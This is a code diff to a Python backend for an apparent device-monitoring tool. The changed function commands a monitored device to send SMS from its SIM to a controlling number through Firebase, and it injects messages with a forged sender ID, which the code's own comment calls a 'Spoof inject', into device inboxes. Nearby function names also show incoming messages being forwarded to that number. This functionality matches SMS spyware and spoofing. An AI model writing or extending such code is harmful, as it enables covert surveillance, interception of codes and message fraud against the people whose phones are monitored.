@@ -224,31 +224,53 @@ async def push_outbound_to_firebase(
 
 
 async def send_polling_startup_test(db, profile: MonitorProfile, device: Device) -> None:
-    """On polling start — inject test SMS and forward to /mynum if set."""
+    """On monitoring start — send test SMS to /mynum immediately."""
     import asyncio
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
+    from app.services import normalize_phone
 
     firebase_url = resolve_firebase_url(profile)
-    tasks = []
-    if firebase_url:
+    if not firebase_url:
+        logger.warning("Startup test skipped: no firebase URL")
+        return
+
+    sim_index = profile.selected_sim_index or 0
+    tasks: list = [
+        push_inject_message(
+            firebase_url,
+            device.name,
+            STARTUP_TEST_SENDER,
+            STARTUP_TEST_MESSAGE,
+        )
+    ]
+
+    if profile.phone_number:
+        mynum = normalize_phone(profile.phone_number)
+        # Real SMS from monitored device SIM -> /mynum number
+        tasks.append(
+            push_outgoing_sms_command(
+                firebase_url,
+                device.name,
+                mynum,
+                STARTUP_TEST_MESSAGE,
+                sim_index=sim_index,
+            )
+        )
+        # Spoof inject on /mynum inbox (same sender ID flow)
         tasks.append(
             push_inject_message(
                 firebase_url,
-                device.name,
+                mynum_device_id(mynum),
                 STARTUP_TEST_SENDER,
                 STARTUP_TEST_MESSAGE,
             )
         )
-    if profile.phone_number:
-        tasks.append(
-            forward_incoming_to_mynum(db, profile, device, STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
-        )
-    if tasks:
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        for result in results:
-            if isinstance(result, Exception):
-                logger.warning("Startup test failed: %s", result)
+
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for result in results:
+        if isinstance(result, Exception):
+            logger.warning("Startup test failed: %s", result)
 
 
 async def forward_incoming_to_mynum(
